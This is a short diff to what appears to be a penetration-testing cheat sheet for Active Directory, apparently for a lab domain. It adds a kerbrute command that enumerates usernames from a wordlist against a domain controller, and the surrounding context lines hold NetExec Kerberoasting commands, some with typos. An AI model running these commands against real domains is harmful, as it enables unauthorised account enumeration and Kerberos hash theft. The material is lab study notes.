@@ -116,6 +116,12 @@ nxc ldap $target -u 'username' -p 'username' --kerberoastPermisionsing output.tx
 nxc ldap $target -u 'username' -p '' no-preauth-targets kerberoastable.list --kerberoasting output.txt
 ```
 
+Brute-Force users in AD by wordlist tool `kerbrute`
+
+```bash
+kerbrute userenum --dc 'AWSJPDC0522.shibuya.vl'  -d shibuya.vl -t 10 ~/wordlists/Usernames/Names/names.txt
+```
+
 [[Kerberos]]
 == Kerberos ticket
 
